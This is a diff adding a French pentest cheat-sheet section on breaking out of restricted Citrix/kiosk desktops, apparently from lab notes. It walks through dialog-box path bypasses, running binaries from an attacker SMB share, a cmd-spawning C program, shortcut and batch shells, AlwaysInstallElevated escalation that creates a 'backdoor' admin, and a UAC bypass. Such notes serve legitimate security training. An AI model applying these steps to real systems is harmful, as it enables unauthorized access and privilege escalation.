@@ -2033,9 +2033,120 @@ Peut permettre un accès réseau supplémentaire.
 - [SessionGopher – RDP / SSH creds](https://github.com/Arvanaghi/SessionGopher) 
 - [MailSniper – recherche mails Exchange](https://github.com/dafthack/MailSniper)   
 
+---
 
+# Citrix Breakout
 
+**But :** contourner les environnements Citrix / RDP / Kiosk restreints pour obtenir un accès interactif au système (cmd/powershell), transférer des fichiers et escalader les privilèges.
 
+## Basic Methodology
+1. Obtenir une **boîte de dialogue Windows (Open/Save/Print/Browse)** via une app autorisée (ex : Paint, WordPad, Notepad).  
+2. Exploiter la boîte de dialogue pour naviguer vers `cmd.exe` ou charger un binaire.  
+3. Exécuter une commande ou un script, puis escalader les privilèges.
+
+## Example Credentials (lab)
+Username: `pmorgan`  
+Password: `Summer1Summer!`  
+Domain: `htb.local`
+
+## Bypassing Path Restrictions
+**Objectif :** accéder à `C:\` via une app autorisée.
+
+1. Ouvrir **Paint** → File → Open (ouvre un *dialog box*).  
+2. Dans *File name*, entrer un chemin UNC local :  
+   `\\127.0.0.1\c$\users\pmorgan`  
+3. Changer *File type* → All Files → Entrée.  
+   → Accès obtenu au répertoire utilisateur bloqué.
+
+**Astuce :** cette méthode contourne les restrictions GPO sur l’explorateur de fichiers.
+
+## Accessing SMB Shares from Restricted Env
+**But :** transférer ou exécuter des fichiers depuis ton attaquant.
+
+1. Sur ton attaquant (Linux / Ubuntu), lancer un SMB share :  
+   `smbserver.py -smb2support share $(pwd)`
+2. Dans Citrix, via Paint → File → Open → entrer UNC path :  
+   `\\10.13.38.95\share`  
+3. Lister les fichiers, clic-droit sur un `.exe` et **Open** → exécution directe.
+
+## Running Custom Binary (pwn.exe)
+**Code du binaire :**
+`#include <stdlib.h>`  
+`int main(){ system("C:\\Windows\\System32\\cmd.exe"); }`
+
+- Compiler et placer sur ton SMB share.  
+- Lancer via la boîte de dialogue → une fenêtre CMD s’ouvre → accès interactif obtenu.  
+- Copier ensuite scripts/tools depuis le share vers `Desktop`.
+
+## Alternate Explorer (Explorer++)
+**But :** contourner File Explorer bloqué.  
+- Utiliser **Explorer++** (portable, pas besoin d’installation).  
+- Permet de copier fichiers depuis `\\attacker\share` → `C:\Users\<user>\Desktop`.  
+- Outil rapide, portable, souvent utilisé en environnement Citrix restreint.
+
+## Alternate Registry Editors
+Si `regedit.exe` est bloqué, utiliser :  
+- **Simpleregedit**, **Uberregedit**, ou **SmallRegistryEditor**  
+→ outils GUI portables permettant modification du registre sans restriction GPO.
+
+## Modify Shortcut File (.lnk)
+**Objectif :** lancer `cmd.exe` via un raccourci modifié.
+
+1. Clic-droit → **Properties** sur un raccourci existant.  
+2. Modifier le champ **Target** :  
+   `C:\Windows\System32\cmd.exe`  
+3. Enregistrer → double-cliquer → CMD lancé.  
+4. Si aucun raccourci dispo, transférer un `.lnk` via SMB ou le créer en PowerShell :  
+   `New-Object -ComObject WScript.Shell` → `.CreateShortcut()`.
+
+## Script Execution (.bat / .vbs / .ps1)
+**Objectif :** exécuter un script pour ouvrir un shell.
+
+1. Créer un fichier `evil.bat`.  
+2. Écrire simplement :  
+   `cmd`  
+3. Sauvegarder → double-cliquer → ouvre une console CMD.  
+→ Peut être utilisé pour lancer d’autres payloads / reverse shells.
+
+## Privilege Escalation
+**Objectif :** exploiter une clé AlwaysInstallElevated pour escalader.
+
+1. Vérifier les clés registre :  
+   `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+   `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+   → Si les deux = 1 → vulnérable.
+
+2. Créer un .msi d’ajout utilisateur :  
+   `Import-Module .\PowerUp.ps1`  
+   `Write-UserAddMSI`  
+   → Crée `UserAdd.msi` sur Desktop.
+
+3. Exécuter le .msi → crée utilisateur admin :  
+   Username: `backdoor` / Password: `T3st@123`
+
+4. Passer sur le nouvel utilisateur :  
+   `runas /user:backdoor cmd`
+
+## Bypass UAC
+**But :** élever encore les privilèges une fois admin local.
+
+1. Importer le script :  
+   `Import-Module .\Bypass-UAC.ps1`
+2. Exécuter :  
+   `Bypass-UAC -Method UacMethodSysprep`
+3. Une nouvelle PowerShell admin s’ouvre → vérifier :  
+   `whoami /priv` ou `whoami /all`  
+4. Accès total → `C:\Users\Administrator\Desktop`.
+
+## Tools / Scripts Utiles
+- [PowerUp.ps1 - élévation de privilèges](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)  
+- [Bypass-UAC.ps1 - bypass UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) 
+
+## References
+- *Breaking out of Citrix and Restricted Desktop environments*  
+- *Breaking out of Windows Environments*  
+
+---
 
 
 
